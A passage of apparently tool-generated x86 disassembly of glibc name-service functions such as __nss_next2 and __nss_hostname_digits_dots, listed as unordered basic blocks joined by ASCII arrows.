0xb10cd18:	ret	
None
|
|
|
v
0xb10ccc7:	mov	ecx, dword ptr [esp + 0x28]
0xb10cccb:	test	ecx, ecx
0xb10cccd:	je	0xb10cca4
None
|
|
|
v
0xb10ccb3:	mov	dword ptr [esi], eax
0xb10ccb5:	mov	dword ptr [esp + 4], ebp
0xb10ccb9:	mov	dword ptr [esp], eax
0xb10ccbc:	call	0xb10cac0
None
|
|
|
v
0xb10cce8:	add	esp, 0x10
0xb10cceb:	xor	eax, eax
0xb10cced:	pop	esi
0xb10ccee:	pop	edi
0xb10ccef:	pop	ebp
0xb10ccf0:	ret	
None
|
|
|
v
0xb10cc70:	push	ebp
0xb10cc71:	push	edi
0xb10cc72:	push	esi
0xb10cc73:	sub	esp, 0x10
0xb10cc76:	mov	esi, dword ptr [esp + 0x20]
0xb10cc7a:	mov	ebp, dword ptr [esp + 0x24]
0xb10cc7e:	mov	edi, dword ptr [esp + 0x2c]
0xb10cc82:	mov	dword ptr [esp + 4], ebp
0xb10cc86:	mov	eax, dword ptr [esi]
0xb10cc88:	mov	dword ptr [esp], eax
0xb10cc8b:	call	0xb10cac0
None
|
|
|
v
0xb10cce1:	test	eax, eax
0xb10cce3:	mov	dword ptr [edi], eax
0xb10cce5:	je	0xb10cca4
None
|
|
|
v
0xb10cccf:	mov	eax, dword ptr [esp + 0x28]
0xb10ccd3:	mov	dword ptr [esp + 4], eax
0xb10ccd7:	mov	eax, dword ptr [esi]
0xb10ccd9:	mov	dword ptr [esp], eax
0xb10ccdc:	call	0xb10cac0
None
|
|
|
v
0xb10cca0:	test	eax, eax
0xb10cca2:	jne	0xb10cce8
None
|
|
|
v
0xb10ccc1:	test	eax, eax
0xb10ccc3:	mov	dword ptr [edi], eax
0xb10ccc5:	jne	0xb10cca0
None
|
|
|
v
0xb10cc9a:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10cd28:	jmp	0xb10cca0
None
|
|
|
v
0xb10ccf8:	cmp	dword ptr [eax], 1
0xb10ccfb:	sbb	eax, eax
0xb10ccfd:	add	esp, 0x10
0xb10cd00:	and	eax, 2
0xb10cd03:	pop	esi
0xb10cd04:	sub	eax, 1
0xb10cd07:	pop	edi
0xb10cd08:	pop	ebp
0xb10cd09:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__nss_next2
TOTAL BLOCKS :28
0xb10cd40:	add	ebx, 0x9e2c0
0xb10cd46:	mov	esi, dword ptr [esp + 0x30]
0xb10cd4a:	mov	ebp, dword ptr [esp + 0x34]
0xb10cd4e:	mov	edi, dword ptr [esp + 0x3c]
0xb10cd52:	test	eax, eax
0xb10cd54:	je	0xb10cdd0
None
|
|
|
v
0xb10ce8d:	lea	eax, dword ptr [ebx - 0x47417]
0xb10ce93:	xor	edx, edx
0xb10ce95:	call	0xb10c980
None
|
|
|
v
0xb10cdf8:	cmp	dword ptr [eax + 8], 1
0xb10cdfc:	jne	0xb10cd68
None
|
|
|
v
0xb10cd6e:	mov	dword ptr [esi], eax
0xb10cd70:	mov	dword ptr [esp + 4], ebp
0xb10cd74:	mov	dword ptr [esp], eax
0xb10cd77:	call	0xb10cac0
None
|
|
|
v
0xb10cd68:	mov	eax, dword ptr [eax]
0xb10cd6a:	test	eax, eax
0xb10cd6c:	je	0xb10cdc0
None
|
|
|
v
0xb10cd7c:	test	eax, eax
0xb10cd7e:	mov	dword ptr [edi], eax
0xb10cd80:	je	0xb10cd90
None
|
|
|
v
0xb10cdd0:	mov	eax, dword ptr [esp + 0x40]
0xb10cdd4:	lea	edx, dword ptr [eax + 2]
0xb10cdd7:	cmp	edx, 4
0xb10cdda:	ja	0xb10ce18
None
|
|
|
v
0xb10cd30:	push	ebp
0xb10cd31:	push	edi
0xb10cd32:	push	esi
0xb10cd33:	push	ebx
0xb10cd34:	sub	esp, 0x1c
0xb10cd37:	mov	eax, dword ptr [esp + 0x44]
0xb10cd3b:	call	0xb1267db
None
|
|
|
v
0xb10cd98:	mov	eax, dword ptr [esp + 0x38]
0xb10cd9c:	mov	dword ptr [esp + 4], eax
0xb10cda0:	mov	eax, dword ptr [esi]
0xb10cda2:	mov	dword ptr [esp], eax
0xb10cda5:	call	0xb10cac0
None
|
|
|
v
0xb10cdb0:	mov	eax, dword ptr [esi]
0xb10cdb2:	mov	edx, dword ptr [eax + 8]
0xb10cdb5:	test	edx, edx
0xb10cdb7:	je	0xb10cd68
None
|
|
|
v
0xb10cd56:	mov	eax, dword ptr [esi]
0xb10cd58:	cmp	dword ptr [eax + 4], 1
0xb10cd5c:	je	0xb10cdf8
None
|
|
|
v
0xb10cdaa:	test	eax, eax
0xb10cdac:	mov	dword ptr [edi], eax
0xb10cdae:	jne	0xb10cd82
None
|
|
|
v
0xb10cdc0:	add	esp, 0x1c
0xb10cdc3:	mov	eax, 0xffffffff
0xb10cdc8:	pop	ebx
0xb10cdc9:	pop	esi
0xb10cdca:	pop	edi
0xb10cdcb:	pop	ebp
0xb10cdcc:	ret	
None
|
|
|
v
0xb10ce26:	lea	esi, dword ptr [esi]
0xb10ce29:	lea	edi, dword ptr [edi]
0xb10ce30:	push	ebx
0xb10ce31:	call	0xb1267db
None
|
|
|
v
0xb10ce18:	lea	eax, dword ptr [ebx - 0x4743b]
0xb10ce1e:	mov	dword ptr [esp], eax
0xb10ce21:	call	0xb068fe0
None
|
|
|
v
0xb10ce0c:	cmp	dword ptr [eax + 0x10], 1
0xb10ce10:	jne	0xb10cd68
None
|
|
|
v
0xb10ce36:	add	ebx, 0x9e1ca
0xb10ce3c:	sub	esp, 8
0xb10ce3f:	mov	eax, dword ptr [esp + 0x10]
0xb10ce43:	xor	eax, dword ptr gs:[0x18]
0xb10ce4a:	rol	eax, 9
0xb10ce4d:	lea	edx, dword ptr [ebx - 0x42384]
0xb10ce53:	mov	dword ptr [ebx + 0x31d0], eax
0xb10ce59:	lea	eax, dword ptr [ebx - 0x4741e]
0xb10ce5f:	mov	byte ptr [ebx + 0x31d4], 1
0xb10ce66:	call	0xb10c980
None
|
|
|
v
0xb10ce6b:	lea	edx, dword ptr [ebx - 0x42384]
0xb10ce71:	lea	eax, dword ptr [ebx - 0x4892b]
0xb10ce77:	call	0xb10c980
None
|
|
|
v
0xb10ce7c:	lea	edx, dword ptr [ebx - 0x48d2d]
0xb10ce82:	lea	eax, dword ptr [ebx - 0x48d11]
0xb10ce88:	call	0xb10c980
None
|
|
|
v
0xb10ce02:	cmp	dword ptr [eax + 0xc], 1
0xb10ce06:	jne	0xb10cd68
None
|
|
|
v
0xb10ce16:	jmp	0xb10cde5
None
|
|
|
v
0xb10cd62:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10cd82:	add	esp, 0x1c
0xb10cd85:	xor	eax, eax
0xb10cd87:	pop	ebx
0xb10cd88:	pop	esi
0xb10cd89:	pop	edi
0xb10cd8a:	pop	ebp
0xb10cd8b:	ret	
None
|
|
|
v
0xb10ce9a:	mov	dword ptr [ebx + 0x3a48], 0xffffffff
0xb10cea4:	mov	dword ptr [ebx + 0x3a54], 0xffffffff
0xb10ceae:	mov	dword ptr [ebx + 0x3a58], 0xffffffff
0xb10ceb8:	mov	dword ptr [ebx + 0x3a70], 0xffffffff
0xb10cec2:	mov	dword ptr [ebx + 0x3a74], 0xffffffff
0xb10cecc:	add	esp, 8
0xb10cecf:	pop	ebx
0xb10ced0:	ret	
None
|
|
|
v
0xb10cd90:	mov	ecx, dword ptr [esp + 0x38]
0xb10cd94:	test	ecx, ecx
0xb10cd96:	je	0xb10cdb0
None
|
|
|
v
0xb10cddc:	mov	eax, dword ptr [esi]
0xb10cdde:	cmp	dword ptr [eax + edx*4 + 4], 1
0xb10cde3:	jne	0xb10cd68
None
|
|
|
v
0xb10cde5:	add	esp, 0x1c
0xb10cde8:	mov	eax, 1
0xb10cded:	pop	ebx
0xb10cdee:	pop	esi
0xb10cdef:	pop	edi
0xb10cdf0:	pop	ebp
0xb10cdf1:	ret	
None
|
|
|
v
0xb10cdb9:	lea	esi, dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__nss_hosts_lookup2
TOTAL BLOCKS :8
0xb10d930:	push	edi
0xb10d931:	mov	edi, eax
0xb10d933:	push	esi
0xb10d934:	push	ebx
0xb10d935:	call	0xb1267db
None
|
|
|
v
0xb10d94d:	mov	eax, dword ptr [esp + 0x30]
0xb10d951:	mov	dword ptr [edi], esi
0xb10d953:	mov	dword ptr [esp + 8], ecx
0xb10d957:	mov	dword ptr [esp + 4], edx
0xb10d95b:	mov	dword ptr [esp + 0xc], eax
0xb10d95f:	mov	dword ptr [esp], edi
0xb10d962:	call	0xb10cc70
None
|
|
|
v
0xb10d970:	lea	eax, dword ptr [ebx + 0x3958]
0xb10d976:	mov	dword ptr [esp + 0xc], eax
0xb10d97a:	lea	eax, dword ptr [ebx - 0x48d2d]
0xb10d980:	mov	dword ptr [esp + 8], eax
0xb10d984:	lea	eax, dword ptr [ebx - 0x48d11]
0xb10d98a:	mov	dword ptr [esp + 4], 0
0xb10d992:	mov	dword ptr [esp], eax
0xb10d995:	mov	dword ptr [esp + 0x1c], ecx
0xb10d999:	mov	dword ptr [esp + 0x18], edx
0xb10d99d:	call	0xb10c5f0
None
|
|
|
v
0xb10d9b6:	mov	eax, 0xffffffff
0xb10d9bb:	jmp	0xb10d967
None
|
|
|
v
0xb10d9a6:	mov	esi, dword ptr [ebx + 0x3958]
0xb10d9ac:	mov	ecx, dword ptr [esp + 0x1c]
0xb10d9b0:	mov	edx, dword ptr [esp + 0x18]
0xb10d9b4:	jmp	0xb10d94d
None
|
|
|
v
0xb10d93a:	add	ebx, 0x9d6c6
0xb10d940:	sub	esp, 0x20
0xb10d943:	mov	esi, dword ptr [ebx + 0x3958]
0xb10d949:	test	esi, esi
0xb10d94b:	je	0xb10d970
None
|
|
|
v
0xb10d9a2:	test	eax, eax
0xb10d9a4:	js	0xb10d9b6
None
|
|
|
v
0xb10d967:	add	esp, 0x20
0xb10d96a:	pop	ebx
0xb10d96b:	pop	esi
0xb10d96c:	pop	edi
0xb10d96d:	ret	4
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__nss_hostname_digits_dots
TOTAL BLOCKS :85
0xb10dede:	cmp	cl, 0x3a
0xb10dee1:	je	0xb10deec
None
|
|
|
v
0xb10e104:	mov	ecx, dword ptr [esp + 0x54]
0xb10e108:	mov	edx, dword ptr [esp + 0x28]
0xb10e10c:	cmp	dword ptr [esp + 0x6c], 2
0xb10e111:	mov	dword ptr [ecx], eax
0xb10e113:	mov	eax, dword ptr [esp + 0x20]
0xb10e117:	mov	dword ptr [eax + 0x18], 0
0xb10e11e:	mov	dword ptr [ecx + 4], edx
0xb10e121:	mov	dword ptr [eax + 0x10], eax
0xb10e124:	mov	dword ptr [eax + 0x14], 0
0xb10e12b:	mov	eax, ecx
0xb10e12d:	mov	ecx, dword ptr [esp + 0x24]
0xb10e131:	mov	dword ptr [eax + 0x10], ecx
0xb10e134:	je	0xb10e1b5
None
|
|
|
v
0xb10e2a9:	add	esp, 0x18
0xb10e2ac:	pop	esi
0xb10e2ad:	ret	
None
|
|
|
v
0xb10e1b0:	jmp	0xb10e00c
None
|
|
|
v
0xb10e243:	mov	eax, dword ptr [esp + 0x70]
0xb10e247:	mov	dword ptr [eax], 0xffffffff
0xb10e24d:	jmp	0xb10e02a
None
|
|
|
v
0xb10e1c8:	mov	eax, dword ptr [esp + 0x20]
0xb10e1cc:	mov	ecx, dword ptr [eax]
0xb10e1ce:	lea	edx, dword ptr [eax + 0xa]
0xb10e1d1:	lea	esi, dword ptr [esi]
0xb10e1d8:	add	eax, 1
0xb10e1db:	cmp	eax, edx
0xb10e1dd:	mov	byte ptr [eax - 1], 0
0xb10e1e1:	jne	0xb10e1d8
None
|
|
|
v
0xb10e1d8:	add	eax, 1
0xb10e1db:	cmp	eax, edx
0xb10e1dd:	mov	byte ptr [eax - 1], 0
0xb10e1e1:	jne	0xb10e1d8
None
|
|
|
v
0xb10dfbd:	xor	eax, eax
0xb10dfbf:	add	esp, 0x3c
0xb10dfc2:	pop	ebx
0xb10dfc3:	pop	esi
0xb10dfc4:	pop	edi
0xb10dfc5:	pop	ebp
0xb10dfc6:	ret	
None
|
|
|
v
0xb10e06a:	mov	edx, dword ptr [esp + 0x5c]
0xb10e06e:	test	edx, edx
0xb10e070:	je	0xb10e178
None
|
|
|
v
0xb10e09c:	test	eax, eax
0xb10e09e:	je	0xb10e209
None
|
|
|
v
0xb10ddde:	mov	eax, dword ptr [esp + 0x58]
0xb10dde2:	mov	eax, dword ptr [eax]
0xb10dde4:	mov	dword ptr [esp + 8], edi
0xb10dde8:	mov	dword ptr [esp + 4], 0
0xb10ddf0:	mov	dword ptr [esp], eax
0xb10ddf3:	call	0xb07ca20
None
|
|
|
v
0xb10e252:	lea	eax, dword ptr [ebx - 0x473b4]
0xb10e258:	mov	dword ptr [esp + 0xc], eax
0xb10e25c:	lea	eax, dword ptr [ebx - 0x473cb]
0xb10e262:	mov	dword ptr [esp + 4], eax
0xb10e266:	lea	eax, dword ptr [ebx - 0x473bd]
0xb10e26c:	mov	dword ptr [esp + 8], 0x97
0xb10e274:	mov	dword ptr [esp], eax
0xb10e277:	call	0xb027820
None
|
|
|
v
0xb10df38:	mov	ecx, dword ptr [esp + 0x54]
0xb10df3c:	mov	dword ptr [ecx], eax
0xb10df3e:	mov	eax, esi
0xb10df40:	mov	dword ptr [esi + 0x18], 0
0xb10df47:	mov	esi, ecx
0xb10df49:	mov	ecx, dword ptr [esp + 0x28]
0xb10df4d:	mov	dword ptr [esi + 4], ecx
0xb10df50:	mov	dword ptr [eax + 0x10], eax
0xb10df53:	mov	dword ptr [eax + 0x14], 0
0xb10df5a:	mov	eax, esi
0xb10df5c:	mov	esi, dword ptr [esp + 0x24]
0xb10df60:	mov	dword ptr [eax + 8], 0xa
0xb10df67:	mov	dword ptr [eax + 0xc], 0x10
0xb10df6e:	mov	dword ptr [eax + 0x10], esi
0xb10df71:	mov	eax, dword ptr [esp + 0x70]
0xb10df75:	mov	dword ptr [eax], 0
0xb10df7b:	mov	eax, dword ptr [esp + 0x5c]
0xb10df7f:	test	eax, eax
0xb10df81:	jne	0xb10e162
None
|
|
|
v
0xb10deec:	add	eax, 1
0xb10deef:	movzx	ecx, byte ptr [eax]
0xb10def2:	test	cl, cl
0xb10def4:	jne	0xb10ded0
None
|
|
|
v
0xb10dfbf:	add	esp, 0x3c
0xb10dfc2:	pop	ebx
0xb10dfc3:	pop	esi
0xb10dfc4:	pop	edi
0xb10dfc5:	pop	ebp
0xb10dfc6:	ret	
None
|
|
|
v
0xb10dd88:	mov	eax, dword ptr [ebx - 0x10]
0xb10dd8e:	mov	eax, dword ptr [esi + eax]
0xb10dd91:	mov	eax, dword ptr [eax + 8]
0xb10dd94:	and	eax, 0x2000
0xb10dd99:	cmp	eax, 1
0xb10dd9c:	sbb	ebp, ebp
0xb10dd9e:	and	ebp, 0xfffffff4
0xb10dda1:	add	ebp, 0x10
0xb10dda4:	cmp	eax, 1
0xb10dda7:	sbb	eax, eax
0xb10dda9:	mov	dword ptr [esp + 0x6c], eax
0xb10ddad:	and	dword ptr [esp + 0x6c], 0xfffffff8
0xb10ddb2:	add	dword ptr [esp + 0x6c], 0xa
0xb10ddb7:	mov	eax, dword ptr [esp + 0x50]
0xb10ddbb:	mov	dword ptr [esp], eax
0xb10ddbe:	call	0xb07ae80
None
|
|
|
v
0xb10e088:	mov	dword ptr [eax], edi
0xb10e08a:	mov	eax, dword ptr [esp + 0x58]
0xb10e08e:	mov	dword ptr [esp + 4], edi
0xb10e092:	mov	eax, dword ptr [eax]
0xb10e094:	mov	dword ptr [esp], eax
0xb10e097:	call	0xb0173e0
None
|
|
|
v
0xb10de2d:	test	cl, cl
0xb10de2f:	mov	edx, dword ptr [esp + 0x50]
0xb10de33:	je	0xb10dfc8
None
|
|
|
v
0xb10dd5b:	mov	eax, dword ptr [esp + 0x50]
0xb10dd5f:	movzx	edx, byte ptr [eax]
0xb10dd62:	movsx	eax, dl
0xb10dd65:	lea	ecx, dword ptr [eax - 0x30]
0xb10dd68:	cmp	ecx, 9
0xb10dd6b:	ja	0xb10dfa0
None
|
|
|
v
0xb10e014:	mov	esi, dword ptr [esp + 0x5c]
0xb10e018:	mov	eax, dword ptr [esp + 0x70]
0xb10e01c:	test	esi, esi
0xb10e01e:	mov	dword ptr [eax], 1
0xb10e024:	je	0xb10e188
None
|
|
|
v
0xb10de4e:	movsx	edi, al
0xb10de51:	sub	edi, 0x30
0xb10de54:	cmp	edi, 9
0xb10de57:	jbe	0xb10de40
None
|
|
|
v
0xb10e060:	mov	esi, dword ptr [esp + 0x70]
0xb10e064:	mov	dword ptr [esi], 0xffffffff
0xb10e06a:	mov	edx, dword ptr [esp + 0x5c]
0xb10e06e:	test	edx, edx
0xb10e070:	je	0xb10e178
None
|
|
|
v
0xb10e1b5:	mov	eax, dword ptr [ebx - 0x10]
0xb10e1bb:	mov	eax, dword ptr [esi + eax]
0xb10e1be:	test	byte ptr [eax + 9], 0x20
0xb10e1c2:	je	0xb10e136
None
|
|
|
v
0xb10def6:	cmp	byte ptr [eax - 1], 0x2e
0xb10defa:	je	0xb10dfbd
None
|
|
|
v
0xb10dfa0:	mov	ecx, dword ptr [ebx - 0x110]
0xb10dfa6:	mov	ecx, dword ptr [esi + ecx]
0xb10dfa9:	test	byte ptr [ecx + eax*2 + 1], 0x10
0xb10dfae:	jne	0xb10dd71
None
|
|
|
v
0xb10df1c:	test	eax, eax
0xb10df1e:	jle	0xb10e014
None
|
|
|
v
0xb10e156:	mov	edx, dword ptr [esp + 0x5c]
0xb10e15a:	test	edx, edx
0xb10e15c:	je	0xb10df87
None
|
|
|
v
0xb10e004:	test	eax, eax
0xb10e006:	setg	al
0xb10e009:	movzx	eax, al
0xb10e00c:	test	eax, eax
0xb10e00e:	jne	0xb10e0f0
None
|
|
|
v
0xb10e00c:	test	eax, eax
0xb10e00e:	jne	0xb10e0f0
None
|
|
|
v
0xb10e162:	mov	eax, dword ptr [esp + 0x64]
0xb10e166:	mov	esi, dword ptr [esp + 0x54]
0xb10e16a:	mov	dword ptr [eax], esi
0xb10e16c:	mov	eax, 1
0xb10e171:	jmp	0xb10e039
None
|
|
|
v
0xb10e178:	mov	esi, dword ptr [esp + 0x68]
0xb10e17c:	mov	dword ptr [esi], 0xfffffffe
0xb10e182:	jmp	0xb10e039
None
|
|
|
v
0xb10dd7d:	cmp	dword ptr [esp + 0x6c], 0xa
0xb10dd82:	mov	bp, 0x10
0xb10dd86:	je	0xb10ddb7
None
|
|
|
v
0xb10df87:	mov	eax, dword ptr [esp + 0x68]
0xb10df8b:	mov	dword ptr [eax], 1
0xb10df91:	mov	eax, 1
0xb10df96:	jmp	0xb10e039
None
|
|
|
v
0xb10dd20:	push	ebp
0xb10dd21:	push	edi
0xb10dd22:	push	esi
0xb10dd23:	mov	esi, dword ptr gs:[0]
0xb10dd2a:	push	ebx
0xb10dd2b:	call	0xb1267db
None
|
|
|
v
0xb10dee3:	cmp	cl, 0x2e
0xb10dee6:	jne	0xb10dfbd
None
|
|
|
v
0xb10e1e3:	mov	eax, dword ptr [esp + 0x20]
0xb10e1e7:	mov	byte ptr [eax + 0xa], 0xff
0xb10e1eb:	mov	byte ptr [eax + 0xb], 0xff
0xb10e1ef:	mov	dword ptr [eax + 0xc], ecx
0xb10e1f2:	mov	eax, dword ptr [esp + 0x54]
0xb10e1f6:	mov	dword ptr [eax + 8], 0xa
0xb10e1fd:	mov	dword ptr [eax + 0xc], 0x10
0xb10e204:	jmp	0xb10e144
None
|
|
|
v
0xb10dec2:	test	cl, cl
0xb10dec4:	mov	eax, dword ptr [esp + 0x50]
0xb10dec8:	jne	0xb10ded7
None
|
|
|
v
0xb10ddb7:	mov	eax, dword ptr [esp + 0x50]
0xb10ddbb:	mov	dword ptr [esp], eax
0xb10ddbe:	call	0xb07ae80
None
|
|
|
v
0xb10deaf:	mov	eax, dword ptr [ebx - 0x10]
0xb10deb5:	mov	eax, dword ptr [esi + eax]
0xb10deb8:	test	byte ptr [eax + 9], 0x20
0xb10debc:	je	0xb10e014
None
|
|
|
v
0xb10e039:	add	esp, 0x3c
0xb10e03c:	pop	ebx
0xb10e03d:	pop	esi
0xb10e03e:	pop	edi
0xb10e03f:	pop	ebp
0xb10e040:	ret	
None
|
|
|
v
0xb10dde4:	mov	dword ptr [esp + 8], edi
0xb10dde8:	mov	dword ptr [esp + 4], 0
0xb10ddf0:	mov	dword ptr [esp], eax
0xb10ddf3:	call	0xb07ca20
None
|
|
|
v
0xb10dfd2:	cmp	dword ptr [esp + 0x6c], 2
0xb10dfd7:	je	0xb10e19c
None
|
|
|
v
0xb10e144:	mov	ecx, dword ptr [esp + 0x70]
0xb10e148:	test	ecx, ecx
0xb10e14a:	je	0xb10e156
None
|
|
|
v
0xb10deca:	jmp	0xb10def6
None
|
|
|
v
0xb10ddc3:	lea	edi, dword ptr [eax + 0x1d]
0xb10ddc6:	mov	eax, dword ptr [esp + 0x5c]
0xb10ddca:	test	eax, eax
0xb10ddcc:	je	0xb10e0b0
None
|
|
|
v
0xb10de5d:	mov	eax, dword ptr [ebx - 0x110]
0xb10de63:	mov	edi, dword ptr [esi + eax]
0xb10de66:	mov	eax, dword ptr [esp + 0x1c]
0xb10de6a:	movzx	ebp, word ptr [edi + eax*2]
0xb10de6e:	test	bp, 0x1000
0xb10de73:	je	0xb10e048
None
|
|
|
v
0xb10e058:	mov	ecx, dword ptr [esp + 0x70]
0xb10e05c:	test	ecx, ecx
0xb10e05e:	je	0xb10e06a
None
|
|
|
v
0xb10e0d6:	mov	eax, dword ptr [ebx - 0xdc]
0xb10e0dc:	mov	dword ptr [esi + eax], 0x22
0xb10e0e3:	mov	eax, 1
0xb10e0e8:	jmp	0xb10e039
None
|
|
|
v
0xb10e0b0:	cmp	edi, dword ptr [esp + 0x60]
0xb10e0b4:	jbe	0xb10ddde
None
|
|
|
v
0xb10de91:	mov	ecx, dword ptr [esp + 0x1c]
0xb10de95:	test	eax, eax
0xb10de97:	je	0xb10e048
None
|
|
|
v
0xb10e051:	xor	eax, eax
0xb10e053:	jmp	0xb10dfbf
None
|
|
|
v
0xb10e14c:	mov	eax, dword ptr [esp + 0x70]
0xb10e150:	mov	dword ptr [eax], 0
0xb10e156:	mov	edx, dword ptr [esp + 0x5c]
0xb10e15a:	test	edx, edx
0xb10e15c:	je	0xb10df87
None
|
|
|
v
0xb10de40:	add	edx, 1
0xb10de43:	movzx	eax, byte ptr [edx]
0xb10de46:	test	al, al
0xb10de48:	je	0xb10dfc8
None
|
|
|
v
0xb10de79:	mov	eax, dword ptr [esp + 0x50]
0xb10de7d:	mov	dword ptr [esp + 4], 0x3a
0xb10de85:	mov	dword ptr [esp + 0x1c], ecx
0xb10de89:	mov	dword ptr [esp], eax
0xb10de8c:	call	0xb07a520
None
|
|
|
v
0xb10dd30:	add	ebx, 0x9d2d0
0xb10dd36:	sub	esp, 0x3c
0xb10dd39:	mov	dword ptr [esp + 4], 0
0xb10dd41:	mov	eax, dword ptr [ebx - 0x10]
0xb10dd47:	mov	eax, dword ptr [esi + eax]
0xb10dd4a:	mov	dword ptr [esp], eax
0xb10dd4d:	call	0xb10bc20
None
|
|
|
v
0xb10de9d:	cmp	dword ptr [esp + 0x6c], 2
0xb10dea2:	je	0xb10e014
None
|
|
|
v
0xb10e048:	cmp	cl, 0x3a
0xb10e04b:	je	0xb10de9d
None
|
|
|
v
0xb10e27c:	nop	
0xb10e27e:	nop	
0xb10e280:	push	esi
0xb10e281:	xor	eax, eax
0xb10e283:	sub	esp, 0x18
0xb10e286:	mov	edx, dword ptr [esp + 0x20]
0xb10e28a:	mov	ecx, dword ptr [esp + 0x24]
0xb10e28e:	test	edx, edx
0xb10e290:	je	0xb10e2a9
None
|
|
|
v
0xb10e076:	mov	esi, dword ptr [esp + 0x64]
0xb10e07a:	mov	dword ptr [esi], 0
0xb10e080:	add	esp, 0x3c
0xb10e083:	pop	ebx
0xb10e084:	pop	esi
0xb10e085:	pop	edi
0xb10e086:	pop	ebp
0xb10e087:	ret	
None
|
|
|
v
0xb10dfb4:	cmp	dl, 0x3a
0xb10dfb7:	je	0xb10dd71
None
|
|
|
v
0xb10dd71:	cmp	dword ptr [esp + 0x6c], 2
0xb10dd76:	mov	ebp, 4
0xb10dd7b:	je	0xb10ddb7
None
|
|
|
v
0xb10e0f0:	mov	eax, dword ptr [esp + 0x50]
0xb10e0f4:	mov	dword ptr [esp + 4], eax
0xb10e0f8:	mov	eax, dword ptr [esp + 0x2c]
0xb10e0fc:	mov	dword ptr [esp], eax
0xb10e0ff:	call	0xb07a810
None
|
|
|
v
0xb10df00:	mov	esi, dword ptr [esp + 0x20]
0xb10df04:	mov	eax, dword ptr [esp + 0x50]
0xb10df08:	mov	dword ptr [esp], 0xa
0xb10df0f:	mov	dword ptr [esp + 8], esi
0xb10df13:	mov	dword ptr [esp + 4], eax
0xb10df17:	call	0xb109ba0
None
|
|
|
v
0xb10ded0:	movsx	edx, cl
0xb10ded3:	movzx	ebp, word ptr [edi + edx*2]
0xb10ded7:	test	bp, 0x1000
0xb10dedc:	jne	0xb10deec
None
|
|
|
v
0xb10e220:	mov	eax, dword ptr [esp + 0x58]
0xb10e224:	mov	dword ptr [eax], 0
0xb10e22a:	mov	eax, dword ptr [esp + 0x5c]
0xb10e22e:	mov	dword ptr [eax], 0
0xb10e234:	mov	dword ptr [esi + edi], ebp
0xb10e237:	mov	edi, dword ptr [esp + 0x70]
0xb10e23b:	test	edi, edi
0xb10e23d:	je	0xb10e02a
None
|
|
|
v
0xb10dfdd:	cmp	dword ptr [esp + 0x6c], 0xa
0xb10dfe2:	jne	0xb10e252
None
|
|
|
v
0xb10ded7:	test	bp, 0x1000
0xb10dedc:	jne	0xb10deec
None
|
|
|
v
0xb10e292:	mov	esi, dword ptr [edx + 0x3c]
0xb10e295:	add	edx, 0x28
0xb10e298:	mov	eax, dword ptr [ecx + 4]
0xb10e29b:	mov	dword ptr [esp + 4], edx
0xb10e29f:	mov	dword ptr [esp], ecx
0xb10e2a2:	mov	dword ptr [esp + 8], esi
0xb10e2a6:	call	dword ptr [eax + 0xc]
None
|
|
|
v
0xb10df24:	mov	eax, dword ptr [esp + 0x50]
0xb10df28:	mov	dword ptr [esp + 4], eax
0xb10df2c:	mov	eax, dword ptr [esp + 0x2c]
0xb10df30:	mov	dword ptr [esp], eax
0xb10df33:	call	0xb07a810
None
|
|
|
v
0xb10dea8:	cmp	dword ptr [esp + 0x6c], 0xa
0xb10dead:	je	0xb10dec2
None
|
|
|
v
0xb10e0cc:	mov	eax, dword ptr [esp + 0x70]
0xb10e0d0:	mov	dword ptr [eax], 0xffffffff
0xb10e0d6:	mov	eax, dword ptr [ebx - 0xdc]
0xb10e0dc:	mov	dword ptr [esi + eax], 0x22
0xb10e0e3:	mov	eax, 1
0xb10e0e8:	jmp	0xb10e039
None
|
|
|
v
0xb10ddd2:	mov	eax, dword ptr [esp + 0x5c]
0xb10ddd6:	cmp	edi, dword ptr [eax]
0xb10ddd8:	ja	0xb10e088
None
|
|
|
v
0xb10de59:	cmp	al, 0x2e
0xb10de5b:	je	0xb10de40
None
|
|
|
v
0xb10e188:	mov	eax, dword ptr [esp + 0x68]
0xb10e18c:	mov	dword ptr [eax], 0
0xb10e192:	mov	eax, 1
0xb10e197:	jmp	0xb10e039
None
|
|
|
v
0xb10dfc8:	cmp	byte ptr [edx - 1], 0x2e
0xb10dfcc:	je	0xb10de5d
None
|
|
|
v
0xb10e209:	mov	eax, dword ptr [esp + 0x58]
0xb10e20d:	mov	edi, dword ptr [ebx - 0xdc]
0xb10e213:	mov	edx, dword ptr [eax]
0xb10e215:	mov	ebp, dword ptr [esi + edi]
0xb10e218:	mov	dword ptr [esp], edx
0xb10e21b:	call	0xb017470
None
|
|
|
v
0xb10e136:	mov	eax, dword ptr [esp + 0x54]
0xb10e13a:	mov	esi, dword ptr [esp + 0x6c]
0xb10e13e:	mov	dword ptr [eax + 0xc], ebp
0xb10e141:	mov	dword ptr [eax + 8], esi
0xb10e144:	mov	ecx, dword ptr [esp + 0x70]
0xb10e148:	test	ecx, ecx
0xb10e14a:	je	0xb10e156
None
|
|
|
v
0xb10e19c:	mov	eax, dword ptr [esp + 0x20]
0xb10e1a0:	mov	dword ptr [esp + 4], eax
0xb10e1a4:	mov	eax, dword ptr [esp + 0x50]
0xb10e1a8:	mov	dword ptr [esp], eax
0xb10e1ab:	call	0xb109600
None
|
|
|
v
0xb10dd52:	cmp	eax, 0xff
0xb10dd55:	je	0xb10e058
None
|
|
|
v
0xb10dfe8:	mov	eax, dword ptr [esp + 0x20]
0xb10dfec:	mov	dword ptr [esp], 0xa
0xb10dff3:	mov	dword ptr [esp + 8], eax
0xb10dff7:	mov	eax, dword ptr [esp + 0x50]
0xb10dffb:	mov	dword ptr [esp + 4], eax
0xb10dfff:	call	0xb109ba0
None
|
|
|
v
0xb10e02a:	mov	eax, dword ptr [esp + 0x64]
0xb10e02e:	mov	dword ptr [eax], 0
0xb10e034:	mov	eax, 1
0xb10e039:	add	esp, 0x3c
0xb10e03c:	pop	ebx
0xb10e03d:	pop	esi
0xb10e03e:	pop	edi
0xb10e03f:	pop	ebp
0xb10e040:	ret	
None
|
|
|
v
0xb10de39:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb10ddf8:	mov	eax, dword ptr [esp + 0x58]
0xb10ddfc:	mov	eax, dword ptr [eax]
0xb10ddfe:	lea	ecx, dword ptr [eax + 0x10]
